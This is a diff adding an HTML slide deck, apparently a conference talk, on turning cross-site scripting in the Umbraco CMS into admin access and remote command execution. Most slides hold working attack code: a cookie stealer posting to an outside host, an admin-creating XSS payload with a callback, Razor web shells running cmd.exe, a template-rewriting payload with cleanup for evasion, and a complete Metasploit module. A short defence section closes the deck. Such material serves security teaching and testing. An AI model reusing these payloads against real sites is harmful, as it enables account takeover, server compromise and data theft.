@@ -1,0 +1,788 @@
+<!doctype html>
+<html>
+
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+	<title>Offensive Umbraco</title>
+
+	<link rel="icon"
+		href="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22%3E%3Ctext%20y=%22.9em%22%20font-size=%2280%22%3E🤬%3C/text%3E%3C/svg%3E">
+
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=PT+Sans&amp;family=VT323&amp;display=swap">
+
+	<link rel="stylesheet" href="dist/reset.css">
+	<link rel="stylesheet" href="dist/reveal.css">
+	<link rel="stylesheet" href="dist/theme/donutsec.css">
+
+	<!-- Theme used for syntax highlighted code -->
+	<link rel="stylesheet" href="plugin/highlight/tomorrow-night.css">
+
+	<style>
+		.mono {
+			font-family: 'VT323' !important;
+		}
+	</style>
+</head>
+
+<body>
+	<div class="reveal">
+		<div class="slides">
+			<section data-background-color="#1a242f" data-background-image="img/BG.svg" data-background-size="700px"
+				data-background-repeat="repeat" data-background-opacity="0.5">
+				<h1 class="mono">🤬<br>Offensive Umbraco</h1>
+				<p>Part 3 &#8211; XSS Weaponisation</p>
+				<small>Steven Harland</small>
+			</section>
+
+			<section>
+				<h3>whoami 👀</h3>
+				<ul>
+					<li>Offensive Security Consultant</li>
+					<li>Former Umbraco Developer</li>
+					<li>Umbraco Security Contributor</li>
+				</ul>
+			</section>
+
+			<section>
+				<h3>Umbraco ❔</h3>
+				<ul>
+					<li>Content Management System (CMS)</li>
+					<li>Built on C#/.NET</li>
+					<li>Open source</li>
+				</ul>
+			</section>
+
+			<section>
+				<h3>XSS ❓</h3>
+				<ul>
+					<li>Cross-site scripting</li>
+					<li>Code injection vulnerability</li>
+					<li>Targets the <em>users</em> of web applications</li>
+				</ul>
+			</section>
+
+			<section>
+				<h3>Demo Environment</h3>
+				<img class="r-stretch" src="img/DemoEnvironment.svg" alt="Demo Environment">
+			</section>
+
+			<section>
+				<h3 class="r-fit-text">Demo: <code>alert(1)</code></h3>
+				<!-- TODO: Recording Here -->
+			</section>
+
+			<!-- Beyond alert(1) -->
+
+			<section data-background-color="#1a242f" data-background-image="img/BG.svg" data-background-size="700px"
+				data-background-repeat="repeat" data-background-opacity="0.5">
+				<h2 class="r-fit-text mono">Beyond alert(🔢)</h2>
+			</section>
+
+			<section>
+				<h3>Objective 🥅</h3>
+				<p><em>Leverage XSS to gain admin access to the Umbraco CMS</em></p>
+			</section>
+
+			<section>
+				<h3>Cookie Stealer</h3>
+				<pre>
+					<code data-trim>
+						&lt;script&gt;
+							fetch('http://kali.umbsec.icu/', {
+								method: 'POST',
+								body: document.cookie
+							});
+						&lt;/script&gt;
+					</code>
+				</pre>
+			</section>
+
+			<section>
+				<h4>Cookie Stealer Usage</h4>
+				<img class="r-stretch" src="img/CookieGrabber.svg" alt="Cookie Grabber">
+			</section>
+
+			<section>
+				<h3>HttpOnly 🛑</h3>
+				<pre><code>Set-Cookie: UMB_UCONTEXT=jlHLF...; path=/; expires=Mon, 03-Apr-2023 14:00:18 GMT; secure; HttpOnly</code></pre>
+			</section>
+
+			<section>
+				<h3>HttpOnly 🛑</h3>
+				<ul>
+					<li>An attribute that makes cookies inaccessible to JavaScript code</li>
+					<li>Renders cookie stealer ineffective</li>
+				</ul>
+			</section>
+
+			<section>
+				<h3>Trying Harder 🎨</h3>
+				<ul>
+					<li>HttpOnly only stops us reading the cookie, but not using it</li>
+					<li>We can still make requests to the application and tell the browser to include cookies in those requests</li>
+				</ul>
+			</section>
+
+			<section>
+				<h3>Create User Payload</h3>
+				<pre>
+					<code data-trim data-line-numbers="2-6|9-16|18-23|24-25|26-29|35-40">
+						&lt;script&gt;
+							// Configuration
+							const userName = "Tester";
+							const userEmail = "tester@demo.umbsec.icu";
+							const userGroups = ["admin"];
+							const callbackURL = "http://kali.umbsec.icu/";
+							
+							(async function () {
+								// Create user object
+								const data = {
+									id: -1,
+									parentId: -1,
+									name: userName,
+									email: userEmail,
+									userGroups: userGroups,
+								};
+								
+								// Call create user API
+								const response = await fetch(
+									"/umbraco/backoffice/UmbracoApi/Users/PostCreateUser",
+									{
+										method: "POST",
+										body: JSON.stringify(data),
+										// Ensure cookies (specifically the Umbraco auth cookie) are sent with the request.
+										credentials: "include",
+										headers: {
+											// Umbraco's XSRF token needs to be passed in a custom header.
+											// This is set in a non-HttpOnly cookie so we can retrieve it in JavaScript.
+											"x-umb-xsrf-token": getCookie("UMB-XSRF-TOKEN"),
+											"Content-Type": "application/json",
+										},
+									}
+								);
+								
+								// Parse response and send to the callback URL
+								const json = toJSON(fromJSON(await response.text()));
+								await fetch(callbackURL, {
+									method: "POST",
+									body: json,
+								});
+								
+								/* 
+								* Helper Functions
+								*/
+								
+								function getCookie(name) {
+									const value = `; ${document.cookie}`;
+									const parts = value.split(`; ${name}=`);
+									if (parts.length === 2) return parts.pop().split(";").shift();
+								}
+								
+								function fromJSON(responseText) {
+									// Remove XSSI prevention prefix from response body before parsing
+									return JSON.parse(responseText.slice(6));
+								}
+								
+								function toJSON(object) {
+									// Pretty print with an indent of 2 spaces
+									return JSON.stringify(object, null, 2);
+								}
+							})();
+						&lt;/script&gt;
+					</code>
+				</pre>
+			</section>
+
+			<section>
+				<h3 class="r-fit-text">Demo: Create User</h3>
+				<!-- TODO: Recording Here -->
+			</section>
+
+			<section>
+				<h3>Objective 🥅</h3>
+				<p><em>Get command execution on the web server</em></p>
+			</section>
+
+			<section>
+				<h3>Code/Command Execution 👩‍💻</h3>
+				<ul>
+					<li>Umbraco allows templates to be edited in the CMS</li>
+					<li>Templates use Razor syntax and can contain C# code, making it trivial to obtain code/command execution</li>
+				</ul>
+			</section>
+
+			<section>
+				<h3>Web Shell Payload</h3>
+				<pre>
+					<code data-trim data-line-numbers="1-8|9-11|12-15">
+						@if (!string.IsNullOrEmpty(Request.QueryString["cmd"]))
+						{
+							try
+							{
+								using (var process = new System.Diagnostics.Process())
+								{
+									process.StartInfo.FileName = "cmd.exe";
+									process.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];
+									process.StartInfo.CreateNoWindow = true;
+									process.StartInfo.RedirectStandardOutput = true;
+									process.StartInfo.UseShellExecute = false;
+									process.Start();
+									var output = process.StandardOutput.ReadToEnd();
+									process.WaitForExit();
+									<pre>@output</pre>
+								}
+							}
+							catch { }
+						}
+					</code>
+				</pre>
+			</section>
+
+			<section>
+				<h3 class="r-fit-text">Demo: Web Shell</h3>
+				<!-- TODO: Recording Here -->
+			</section>
+
+			<!-- Weaponisation -->
+
+			<section data-background-color="#1a242f" data-background-image="img/BG.svg" data-background-size="700px"
+				data-background-repeat="repeat" data-background-opacity="0.5">
+				<h2 class="r-fit-text mono">Weaponisation 🏹</h2>
+			</section>
+
+			<section>
+				<h3>Issues with Previous Approach</h3>
+				<ul>
+					<li>Too many manual steps</li>
+					<li>Access to <em>/umbraco/</em> is often IP restricted</li>
+					<li>Large payload</li>
+					<li>Bad OpSec</li>
+				</ul>
+			</section>
+
+			<section>
+				<h3>OpSec Fails</h3>
+				<img class="r-stretch" src="img/OpSecFail1a.png" alt="Unobfuscated XSS payload written to database">
+			</section>
+
+			<section>
+				<h3>OpSec Fails</h3>
+				<img class="r-stretch" src="img/OpSecFail1b.png" alt="Inline JavaScript blocks page rendering">
+			</section>
+
+			<section>
+				<h3>OpSec Fails</h3>
+				<img class="r-stretch" src="img/OpSecFail2.png" alt="New user created in CMS">
+			</section>
+
+			<section>
+				<h3>OpSec Fails</h3>
+				<img class="r-stretch" src="img/OpSecFail3.png" alt="Logging in as the new user leaves a trail of logs">
+			</section>
+
+			<section>
+				<h3>OpSec Fails</h3>
+				<img class="r-stretch" src="img/OpSecFail4.png" alt="Razor payload written to disk">
+			</section>
+
+			<section>
+				<h3>OpSec Fails</h3>
+				<img class="r-stretch" src="img/OpSecFail5.png" alt="Web shell commands appear in IIS logs">
+			</section>
+
+			<section>
+				<h3>OpSec Fails 🕵️‍♀️</h3>
+				<p>...</p>
+			</section>
+
+			<section>
+				<h3>New Objective 🥅</h3>
+				<p><em>Leverage XSS to get a reverse shell on the web server</em></p>
+			</section>
+
+			<section>
+				<h3>Requirements 📋</h3>
+				<ul>
+					<li>Obfuscated XSS payload</li>
+					<li>Hosted remotely on burnable infrastructure</li>
+					<li>
+						Do <em>not</em> create a new CMS user
+						<ul>
+							<li>Use JavaScript to drop Razor shell and trigger command execution</li>
+						</ul>
+					</li>
+					<li>Leave as few log entries as possible</li>
+					<li>Clean up at the end</li>
+				</ul>
+			</section>
+
+			<section>
+				<h3>New Web Shell Payload</h3>
+				<pre>
+					<code data-trim data-line-numbers="1,5-6">
+						@if (!string.IsNullOrEmpty(Request.Headers["Authorization"]))
+						{
+							try
+							{
+								var cmd = System.Text.Encoding.UTF8.GetString(
+									System.Convert.FromBase64String(Request.Headers["Authorization"]));
+								using (var process = new System.Diagnostics.Process())
+								{
+									process.StartInfo.FileName = "cmd.exe";
+									process.StartInfo.Arguments = "/c " + cmd;
+									process.StartInfo.CreateNoWindow = true;
+									process.StartInfo.RedirectStandardOutput = true;
+									process.StartInfo.UseShellExecute = false;
+									process.Start();
+									var output = process.StandardOutput.ReadToEnd();
+									process.WaitForExit();
+									<pre>@output</pre>
+								}
+							}
+							catch { }
+						}
+					</code>
+				</pre>
+			</section>
+
+			<section>
+				<h3>New XSS Payload</h3>
+				<pre>
+					<code class="javascript" data-trim data-line-numbers="92-117|1-6|8-17|18-19|21-22|24-25|28-33|34-36">
+// Payload configuration
+const cmdBase64 = "";
+const umbracoAPI = "/umbraco/backoffice/UmbracoApi";
+const razorTemplateName = "Home";
+const triggerURL = "/";
+const triggerHeaderName = "Authorization";
+
+// Get all templates
+getJSON(umbracoAPI + "/Template/GetAll").then(function (allTemplates) {
+  // Get template metadata by name
+  const templateMetadata = allTemplates.find(function (template) {
+    return template.name.includes(razorTemplateName);
+  });
+
+  // Get full template
+  getJSON(umbracoAPI + "/Template/GetById?id=" + templateMetadata.id).then(
+    function (template) {
+      // Save original template. It will be restored later on
+      const originalTemplate = template.content;
+
+      // Add payload to the end of the template
+      template.content += generateRazor();
+
+      // Save template
+      postJSON(umbracoAPI + "/Template/PostSave", template).then(function (
+        savedTemplate
+      ) {
+        // Hit URL to trigger command execution
+        const triggerHeaders = {};
+        triggerHeaders[triggerHeaderName] = cmdBase64;
+        fetch(triggerURL, {
+          headers: triggerHeaders,
+        }).then(function (response) {
+          // Reset to original template
+          template.content = originalTemplate;
+          postJSON(umbracoAPI + "/Template/PostSave", template);
+        });
+      });
+    }
+  );
+});
+
+/*
+* Helper Functions
+*/
+
+function getCookie(name) {
+  const value = "; " + document.cookie;
+  const parts = value.split("; " + name + "=");
+  if (parts.length === 2) return parts.pop().split(";").shift();
+}
+
+function getJSON(url) {
+  return fetch(url, {
+    method: "GET",
+    credentials: "include",
+    headers: {
+      "x-umb-xsrf-token": getCookie("UMB-XSRF-TOKEN"),
+    },
+  })
+    .then(function (response) {
+      return response.text();
+    })
+    .then(function (text) {
+      return fromJSON(text);
+    });
+}
+
+function postJSON(url, data) {
+  return fetch(url, {
+    method: "POST",
+    body: JSON.stringify(data),
+    credentials: "include",
+    headers: {
+      "x-umb-xsrf-token": getCookie("UMB-XSRF-TOKEN"),
+      "Content-Type": "application/json",
+    },
+  })
+    .then(function (response) {
+      return response.text();
+    })
+    .then(function (text) {
+      return fromJSON(text);
+    });
+}
+
+function fromJSON(responseText) {
+  // Remove XSSI prevention prefix from response body before parsing
+  return JSON.parse(responseText.slice(6));
+}
+
+function generateRazor() {
+  return (
+    '\n@if (!string.IsNullOrEmpty(Request.Headers["' +
+    triggerHeaderName +
+    '"]))' +
+    "{" +
+    "try" +
+    "{" +
+    "var cmd = System.Text.Encoding.UTF8.GetString(" +
+    'System.Convert.FromBase64String(Request.Headers["' +
+    triggerHeaderName +
+    '"]));' +
+    "using (var process = new System.Diagnostics.Process())" +
+    "{" +
+    'process.StartInfo.FileName = "cmd.exe";' +
+    'process.StartInfo.Arguments = "/c " + cmd;' +
+    "process.StartInfo.CreateNoWindow = true;" +
+    "process.StartInfo.RedirectStandardOutput = true;" +
+    "process.StartInfo.UseShellExecute = false;" +
+    "process.Start();" +
+    "}" +
+    "}" +
+    "catch { }" +
+    "}"
+  );
+}
+					</code>
+				</pre>
+			</section>
+
+			<section>
+				<h3>Metasploit Module</h3>
+				<pre>
+					<code class="ruby" data-trim data-line-numbers="1|4-5|11-22|20|27-36|52-172|39-43|45-50">
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::HttpServer::HTML
+  include Msf::Exploit::JSObfu
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Umbraco CMS Remote Command Execution via XSS',
+        'Description' => %q{
+          This module hosts an XSS payload that abuses Umbraco's
+          Razor templates to execute commands.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => ['stvnhrlnd'],
+        'Targets' => [
+          ['Umbraco 8 on Windows', {
+            'Arch' => ARCH_CMD,
+            'Platform' => 'win'
+          }]
+        ],
+      )
+    )
+
+    register_options([
+      OptString.new('BACKOFFICE_API',
+        [ true, 'The path to the Umbraco backoffice API', '/umbraco/backoffice/UmbracoApi' ]),
+      OptString.new('RAZOR_TEMPLATE',
+        [ true, 'The name of the Razor template to use for code execution', 'Home' ]),
+      OptString.new('TRIGGER_URL',
+        [ true, 'The URL of the page to request to trigger the command', '/' ]),
+      OptString.new('TRIGGER_HEADER',
+        [ true, 'The name of the HTTP header to trigger the command', 'Authorization' ])
+    ])
+  end
+
+  def exploit
+    print_status('Obfuscating JavaScript...')
+    @js_ofs = js_obfuscate(generate_js)
+    super
+  end
+
+  def on_request_uri(cli, _request)
+    print_status('Serving XSS payload...')
+    send_response(cli, @js_ofs, headers = {
+      'Content-Type' => 'text/javascript'
+    })
+  end
+
+  def generate_js
+    cmdBase64 = Base64.strict_encode64(payload.encoded)
+
+    %Q~
+
+    // Payload configuration
+    const cmdBase64 = "#{cmdBase64}";
+    const umbracoAPI = "#{datastore['BACKOFFICE_API']}";
+    const razorTemplateName = "#{datastore['RAZOR_TEMPLATE']}";
+    const triggerURL = "#{datastore['TRIGGER_URL']}";
+    const triggerHeaderName = "#{datastore['TRIGGER_HEADER']}";
+    
+    // Get all templates
+    getJSON(umbracoAPI + "/Template/GetAll").then(function (allTemplates) {
+      // Get template metadata by name
+      const templateMetadata = allTemplates.find(function (template) {
+        return template.name.includes(razorTemplateName);
+      });
+    
+      // Get specific template
+      getJSON(umbracoAPI + "/Template/GetById?id=" + templateMetadata.id).then(
+        function (template) {
+          // Save original template. It will be restored later on
+          const originalTemplate = template.content;
+    
+          // Add payload to the end of the template
+          template.content += generateRazor();
+    
+          // Save template
+          postJSON(umbracoAPI + "/Template/PostSave", template).then(function (
+            savedTemplate
+          ) {
+            // Hit URL to trigger command execution
+            const triggerHeaders = {};
+            triggerHeaders[triggerHeaderName] = cmdBase64;
+            fetch(triggerURL, {
+              headers: triggerHeaders,
+            }).then(function (response) {
+              // Reset to original template
+              template.content = originalTemplate;
+              postJSON(umbracoAPI + "/Template/PostSave", template);
+            });
+          });
+        }
+      );
+    });
+    
+    function getCookie(name) {
+      const value = "; " + document.cookie;
+      const parts = value.split("; " + name + "=");
+      if (parts.length === 2) return parts.pop().split(";").shift();
+    }
+    
+    function getJSON(url) {
+      return fetch(url, {
+        method: "GET",
+        credentials: "include",
+        headers: {
+          "x-umb-xsrf-token": getCookie("UMB-XSRF-TOKEN"),
+        },
+      })
+        .then(function (response) {
+          return response.text();
+        })
+        .then(function (text) {
+          return fromJSON(text);
+        });
+    }
+    
+    function postJSON(url, data) {
+      return fetch(url, {
+        method: "POST",
+        body: JSON.stringify(data),
+        credentials: "include",
+        headers: {
+          "x-umb-xsrf-token": getCookie("UMB-XSRF-TOKEN"),
+          "Content-Type": "application/json",
+        },
+      })
+        .then(function (response) {
+          return response.text();
+        })
+        .then(function (text) {
+          return fromJSON(text);
+        });
+    }
+    
+    function fromJSON(responseText) {
+      // Remove XSSI prevention prefix from response body before parsing
+      return JSON.parse(responseText.slice(6));
+    }
+    
+    function generateRazor() {
+      return (
+        '\\n@if (!string.IsNullOrEmpty(Request.Headers["' +
+        triggerHeaderName +
+        '"]))' +
+        "{" +
+        "try" +
+        "{" +
+        "var cmd = System.Text.Encoding.UTF8.GetString(" +
+        'System.Convert.FromBase64String(Request.Headers["' +
+        triggerHeaderName +
+        '"]));' +
+        "using (var process = new System.Diagnostics.Process())" +
+        "{" +
+        'process.StartInfo.FileName = "cmd.exe";' +
+        'process.StartInfo.Arguments = "/c " + cmd;' +
+        "process.StartInfo.CreateNoWindow = true;" +
+        "process.StartInfo.RedirectStandardOutput = true;" +
+        "process.StartInfo.UseShellExecute = false;" +
+        "process.Start();" +
+        "}" +
+        "}" +
+        "catch { }" +
+        "}"
+      );
+    }
+
+    ~
+  end
+end
+					</code>
+				</pre>
+			</section>
+
+			<section>
+				<h3 class="r-fit-text">Demo: XSS to Reverse Shell</h3>
+				<!-- TODO: Recording Here -->
+			</section>
+
+			<section data-background-color="#1a242f" data-background-image="img/BG.svg" data-background-size="700px"
+				data-background-repeat="repeat" data-background-opacity="0.5">
+				<h2 class="r-fit-text mono">Defence 🛡️</h2>
+			</section>
+
+			<section>
+				<h3>Defence in Depth 🥞</h3>
+				<ul>
+					<li>XSS Prevention</li>
+					<li>Content Security Policy</li>
+					<li>CMS Permissions</li>
+					<li>File/Folder Permissions</li>
+					<li>...</li>
+				</ul>
+			</section>
+
+			<section>
+				<h3>XSS Prevention 🚫</h3>
+				<ul>
+					<li>
+						Validate input
+						<ul><li>Reject inputs containing dangerous characters</li></ul>
+					</li>
+					<li>
+						Sanitise input
+						<ul><li>Accept input but attempt to strip out dangerous characters</li></ul>
+					</li>
+					<li>
+						Encode output
+						<ul><li>Prevent raw HTML/JavaScript code being sent to the browser</li></ul>
+					</li>
+				</ul>
+				<p>
+					<small>
+						<a href="https://portswigger.net/web-security/cross-site-scripting/preventing">
+							https://portswigger.net/web-security/cross-site-scripting/preventing
+						</a>
+					</small>
+				</p>
+			</section>
+
+			<section>
+				<h3>Content Security Policy 🚓</h3>
+				<ul>
+					<li>HTTP header or meta tag</li>
+					<li>Tells browsers where it's safe to load resources from</li>
+				</ul>
+				<pre>
+					<code data-trim>
+						Content-Security-Policy: connect-src 'self';
+					</code>
+				</pre>
+				<img class="r-stretch" src="img/CSP.png" alt="CSP Violation">
+				<p>
+					<small>
+						<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/connect-src">
+							https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/connect-src
+						</a>
+					</small>
+				</p>
+			</section>
+
+			<section>
+				<h3>CMS Permissions 🔓</h3>
+				<ul>
+					<li>Use principle of least privilege</li>
+					<li>Restrict use of admin accounts</li>
+				</ul>
+			</section>
+
+			<section>
+				<h3>File/Folder Permissions 🔓</h3>
+				<ul>
+					<li>
+						Folders containing executable code should be read-only for the application pool user
+						<ul>
+							<li><em>~/bin/</em></li>
+							<li><em>~/Views/</em></li>
+							<li><em>~/App_Code/</em></li>
+						</ul>
+					</li>
+				</ul>
+				<p>
+					<small>
+						<a href="https://our.umbraco.com/Documentation/Fundamentals/Setup/Server-Setup/permissions">
+							https://our.umbraco.com/Documentation/Fundamentals/Setup/Server-Setup/permissions
+						</a>
+					</small>
+				</p>
+			</section>
+
+			<section>
+				<h3>Takeaways 🍔🍟</h3>
+				<ul>
+					<li>We can do better than <code>alert(1)</code></li>
+					<li>HttpOnly is just one layer of defence</li>
+					<li>Think about what functionality the application provides and if it can be abused</li>
+					<li>You are only limited by the capabilities of JavaScript &#8211; get creative!</li>
+					<li>Package exploits for reuse!</li>
+				</ul>
+			</section>
+
+			<section data-background-color="#1a242f" data-background-image="img/BG.svg" data-background-size="700px"
+				data-background-repeat="repeat" data-background-opacity="0.5">
+				<img class="r-frame" src="img/UmbKenny.jpg"><br>
+				<a href="https://twitter.com/stvnhrlnd">@stvnhrlnd</a>
+			</section>
+		</div>
+	</div>
+
+	<script src="dist/reveal.js"></script>
+	<script src="plugin/notes/notes.js"></script>
+	<script src="plugin/markdown/markdown.js"></script>
+	<script src="plugin/highlight/highlight.js"></script>
+	<script>
+		// More info about initialization & config:
+		// - https://revealjs.com/initialization/
+		// - https://revealjs.com/config/
+		Reveal.initialize({
+			hash: true,
+
+			// Learn about plugins: https://revealjs.com/plugins/
+			plugins: [RevealMarkdown, RevealHighlight, RevealNotes]
+		});
+	</script>
+</body>
+
+</html>
